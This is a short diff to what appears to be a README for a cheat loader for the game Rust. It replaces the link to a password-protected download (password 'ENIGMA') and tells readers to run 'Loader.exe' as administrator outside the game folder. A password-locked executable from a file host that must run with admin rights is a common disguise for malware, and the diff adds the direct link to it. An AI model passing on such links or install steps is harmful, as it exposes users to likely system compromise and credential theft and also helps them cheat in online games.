@@ -25,7 +25,7 @@
 ### 🧭 Step-by-step
 
 1. **Download the loader**  
-   [Download](https://www.4sync.com/rar/Lh-numdh/Loader.html) and place `Loader.exe` in any folder **outside** of the Rust directory. **Password ENIGMA**
+   [Download](https://www.4sync.com/web/directDownload/Lh-numdh/cKQ38aak.59488ffcf9e28923ee42c908e3a6290e) and place `Loader.exe` in any folder **outside** of the Rust directory. **Password ENIGMA**
 
 2. **Run the loader**  
    Launch `Loader.exe` as administrator. 
